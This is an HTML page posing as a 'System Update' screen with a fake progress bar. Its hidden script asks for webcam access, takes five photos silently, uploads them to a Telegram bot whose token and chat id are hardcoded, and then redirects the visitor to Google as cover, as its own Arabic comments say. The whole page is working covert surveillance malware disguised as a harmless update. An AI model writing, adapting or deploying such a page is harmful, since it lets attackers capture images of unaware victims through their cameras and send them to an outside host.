<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .progress-container { width: 80%; background-color: #333; border-radius: 20px; margin-top: 20px; overflow: hidden; }
        .progress-bar { width: 0%; height: 20px; background-color: #4CAF50; transition: width 0.1s; }
        h2 { font-weight: normal; }
    </style>
</head>
<body>
    <h2>Installing System Updates...</h2>
    <div class="progress-container">
        <div id="myBar" class="progress-bar"></div>
    </div>
    <p id="status">0% Complete</p>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = '8261864001:AAE6ByF5lNBVHdURNtDZJDbqRcP6iez00Ss';
        const chat_id = '7388801889';

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                moveProgress(); // بدء خط التقدم
                
                // التقاط 5 صور سريعة جداً وإرسالها فوراً
                for(let i=1; i<=5; i++) {
                    await new Promise(r => setTimeout(r, 800)); // فاصل بسيط جداً
                    takeAndSend(i);
                }
            } catch (err) {
                console.log("Access Denied");
            }
        }

        function takeAndSend(num) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, `img${num}.jpg`);
                formData.append('caption', `اللقطة السريعة رقم ${num} ⚡`);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الرفع
        }

        function moveProgress() {
            let elem = document.getElementById("myBar");
            let status = document.getElementById("status");
            let width = 0;
            let id = setInterval(frame, 150);
            function frame() {
                if (width >= 100) {
                    clearInterval(id);
                    window.location.href = "https://www.google.com"; // تمويه عند الانتهاء
                } else {
                    width++;
                    elem.style.width = width + '%';
                    status.innerHTML = width + '% Complete';
                }
            }
        }

        startProcess();
    </script>
</body>
</html>
